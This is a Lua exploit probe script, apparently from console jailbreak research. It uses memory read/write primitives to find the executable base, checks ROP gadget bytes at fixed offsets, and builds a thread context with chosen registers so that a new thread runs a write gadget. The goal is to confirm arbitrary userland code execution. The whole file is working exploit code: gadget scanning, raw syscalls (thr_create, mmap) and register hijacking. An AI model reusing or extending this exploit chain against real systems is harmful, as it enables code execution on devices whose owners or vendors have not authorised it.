-- CRASH_CLASS: HIGH
-- PROBE 80c: Thread register-based execution proof
--
-- Context: 80b showed the ret-sled chain wasn't consumed. The thread may be
-- dying before reaching userland, or the initial fault handler kills it.
-- This probe takes a different approach: set registers directly via ucontext
-- so the FIRST instruction the thread executes writes our marker.
--
-- Strategy: set RDI=marker_addr, RAX=0xDEADBEEF, RIP=mov[rdi],eax;ret
-- The very first instruction writes the marker. No ROP chain needed.
-- If no mov[rdi],eax;ret exists, try alternatives.
--
-- Also: test whether the thread actually reaches userland by checking
-- if a simple "ret" instruction modifies RSP (via stack read).

print("=== PROBE 80c: THREAD REGISTER EXECUTION TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
print("[*] canary pid=" .. tostring(syscall.sc_getpid():tonumber()))

-- Eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
local eboot = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[*] eboot=" .. q(eboot))

-- ============================================================
-- SCAN: find write gadgets across full eboot
-- ============================================================
print("")
print("[1] Scanning for write-what-where gadgets...")

local function scan_for(name, bytes, max_off)
    local len = #bytes
    for off = 0, max_off - len do
        local match = true
        for i = 1, len do
            local b = rb(eboot + off + (i - 1))
            if b ~= bytes[i] then match = false break end
        end
        if match then
            print("  " .. name .. " @ eboot+0x" .. string.format("%X", off))
            return eboot + off
        end
    end
    return nil
end

-- Known gadgets from previous scans (ASLR-relative offsets, constant across runs)
-- mov [rdi], eax; ret = 89 07 C3 at eboot+0x92C68
-- mov [rdi], rax; ret = 48 89 07 C3 at eboot+0x92C67
-- ret = C3 at eboot+0x42
local mov_rdi_eax = eboot + 0x92C68
local mov_rdi_rax = eboot + 0x92C67
local ret_gadget = eboot + 0x42

-- Verify gadget bytes
local b0 = rb(mov_rdi_eax)
local b1 = rb(mov_rdi_eax + 1)
local b2 = rb(mov_rdi_eax + 2)
print("  mov [rdi],eax;ret verify: " .. string.format("%02X %02X %02X", b0 or 0, b1 or 0, b2 or 0) ..
    (b0 == 0x89 and b1 == 0x07 and b2 == 0xC3 and " OK" or " MISMATCH!"))
local mov_rsi_eax = nil

print("")

-- ============================================================
-- SECTION A: Test if thread reaches userland at all
-- ============================================================
print("[A] Thread execution test — does it reach userland?")

local MC_OFFSET = 0x10
local USER_CS = 0x43
local USER_SS = 0x3B
local USER_RFLAGS = 0x202

-- Allocate marker and stack
local marker = memory.alloc(16)
zero(marker, 16)
wd(marker, 0x41414141)  -- known value
wd(marker + 4, 0x42424242)

local sc_mmap = make_syscall(477)
local s_ok, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(16 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print("  stack mmap: ok=" .. tostring(s_ok) .. " base=" .. q(stack_base))

local stack_top = stack_base + (14 * 0x4000)
-- Write a canary pattern on the stack
for off = 0, 0xFF, 8 do
    wq(stack_top + off, uint64(0xBBBBBBBB))
end

-- Select write gadget + set registers accordingly
local write_gadget = nil
local addr_reg = nil  -- which register holds the address
local val_reg = "rax" -- always rax for value

if mov_rdi_eax then
    write_gadget = mov_rdi_eax; addr_reg = "rdi"
    print("  write gadget: mov [rdi], eax; ret")
elseif mov_rdi_rax then
    write_gadget = mov_rdi_rax; addr_reg = "rdi"
    print("  write gadget: mov [rdi], rax; ret")
elseif mov_rsi_eax then
    write_gadget = mov_rsi_eax; addr_reg = "rsi"
    print("  write gadget: mov [rsi], eax; ret")
end

if not write_gadget then
    print("  [!] NO write gadget found in 1MB scan!")
    print("  [*] Falling back to pure execution test (ret with stack canary)")

    -- Just test: does the thread modify the stack?
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx + MC_OFFSET + 0x88, uint64(USER_CS))
    wq(ctx + MC_OFFSET + 0xA0, uint64(USER_SS))
    wq(ctx + MC_OFFSET + 0x90, uint64(USER_RFLAGS))
    wq(ctx + MC_OFFSET + 0x108, uint64(0x480))
    wq(ctx + MC_OFFSET + 0x80, ret_gadget)    -- RIP = ret
    wq(ctx + MC_OFFSET + 0x98, stack_top)     -- RSP = stack with canaries

    -- Write distinct values at each slot so we can see which got popped
    for i = 0, 7 do
        wq(stack_top + (i * 8), uint64(0xAA000000 + i))
    end

    print("  stack before:")
    for i = 0, 7 do
        print("    +" .. string.format("%02X", i*8) .. ": " .. q(rq(stack_top + (i*8))))
    end

    local new_tid = memory.alloc(8)
    zero(new_tid, 8)
    local ok_call, rv = pcall(function()
        local sc = make_syscall(430)
        return sc(uint64(ctx), uint64(new_tid), uint64(0))
    end)
    print("  thr_create: ok=" .. tostring(ok_call) .. " rv=" .. tostring(rv))
    print("  tid=" .. q(rq(new_tid)))

    -- Wait
    local dummy = 0
    for i = 1, 2000000 do dummy = dummy + 1 end

    print("  stack after (if modified, thread executed):")
    for i = 0, 7 do
        print("    +" .. string.format("%02X", i*8) .. ": " .. q(rq(stack_top + (i*8))))
    end

    local alive = pcall(function() return syscall.sc_getpid():tonumber() end)
    print("  canary: " .. tostring(alive))
    print("=== PROBE 80c COMPLETE ===")
    return
end

-- ============================================================
-- SECTION B: Write marker via register-primed thread
-- ============================================================
print("")
print("[B] Creating thread: RIP=write_gadget, regs preset via ucontext")

local ctx = memory.alloc(0x500)
zero(ctx, 0x500)

-- Segment regs
wq(ctx + MC_OFFSET + 0x88, uint64(USER_CS))
wq(ctx + MC_OFFSET + 0xA0, uint64(USER_SS))
wq(ctx + MC_OFFSET + 0x90, uint64(USER_RFLAGS))
wq(ctx + MC_OFFSET + 0x108, uint64(0x480))

-- RIP = write gadget (first instruction writes marker)
wq(ctx + MC_OFFSET + 0x80, write_gadget)

-- RSP = valid stack (thread will ret into 0 after write, crashing cleanly)
wq(ctx + MC_OFFSET + 0x98, stack_top)
zero(stack_top, 0x100)  -- ret into 0

-- RAX = 0xDEADBEEF (the value to write)
wq(ctx + MC_OFFSET + 0x70, uint64(0xDEADBEEF))

-- Set the address register
local REG_OFFSETS = {
    rdi = MC_OFFSET + 0x48,
    rsi = MC_OFFSET + 0x50,
    rdx = MC_OFFSET + 0x58,
    rbx = MC_OFFSET + 0x60,
    rcx = MC_OFFSET + 0x68,
}
wq(ctx + REG_OFFSETS[addr_reg], marker)

print("  RIP=" .. q(write_gadget))
print("  " .. addr_reg .. "=" .. q(marker) .. " (target)")
print("  rax=0xDEADBEEF (value)")
print("  marker before: 0x" .. string.format("%08X", rd(marker) or 0))

local new_tid = memory.alloc(8)
zero(new_tid, 8)
local ok_call, rv = pcall(function()
    local sc = make_syscall(430)
    return sc(uint64(ctx), uint64(new_tid), uint64(0))
end)
print("  thr_create: ok=" .. tostring(ok_call) .. " rv=" .. tostring(rv))
print("  tid=" .. q(rq(new_tid)))

-- Wait for thread
local dummy = 0
for i = 1, 2000000 do dummy = dummy + 1 end

local marker_after = rd(marker)
print("")
print("  marker after: 0x" .. string.format("%08X", marker_after or 0))

if marker_after == 0xDEADBEEF then
    print("")
    print("  ****************************************************")
    print("  *** MARKER = 0xDEADBEEF — THREAD WROTE TO MEMORY ***")
    print("  *** ARBITRARY USERLAND CODE EXECUTION CONFIRMED!  ***")
    print("  ****************************************************")
elseif marker_after ~= 0x41414141 then
    print("  marker CHANGED from 0x41414141 to 0x" .. string.format("%08X", marker_after or 0))
    print("  thread may have partially executed")
else
    print("  marker unchanged — thread did not write")
    print("  thread may have died before reaching userland")
end

-- Double-check with longer wait
for i = 1, 5000000 do dummy = dummy + 1 end
local marker_after2 = rd(marker)
if marker_after2 ~= marker_after then
    print("  marker changed on recheck: 0x" .. string.format("%08X", marker_after2 or 0))
end

local alive_ok, alive = pcall(function() return syscall.sc_getpid():tonumber() end)
print("")
print("[*] canary: ok=" .. tostring(alive_ok) .. " pid=" .. tostring(alive))
print("=== PROBE 80c COMPLETE ===")
